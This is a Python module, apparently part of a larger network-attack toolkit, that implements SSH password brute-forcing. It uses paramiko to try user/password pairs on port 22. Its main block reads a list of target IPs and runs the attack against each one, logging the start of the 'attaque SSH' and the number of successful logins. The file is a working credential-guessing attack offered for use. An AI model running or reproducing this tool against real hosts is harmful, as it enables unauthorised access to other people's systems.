import os
import csv
import paramiko
import socket
import threading
import logging
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.base_connector import BaseConnector, BaseBruteforce

logger = Logger(name="ssh_connector.py", level=logging.DEBUG)

b_class = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port = 22
b_parent = None

class SSHBruteforce(BaseBruteforce):
    def __init__(self, shared_data):
        super().__init__(shared_data, SSHConnector(shared_data))

class SSHConnector(BaseConnector):
    PORT = 22
    SERVICE_NAME = "SSH"

    @property
    def output_file(self):
        return self.shared_data.sshfile

    def connect(self, ip, user, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
        try:
            ssh.connect(ip, username=user, password=password, banner_timeout=200)
            return True
        except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
            return False
        finally:
            ssh.close()

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Démarrage de l'attaque SSH... sur le port 22")
        ips_to_scan = shared_data.read_data()
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Nombre total de succès: {len(ssh_bruteforce.connector.results)}")
        exit(len(ssh_bruteforce.connector.results))
    except Exception as e:
        logger.error(f"Erreur: {e}")
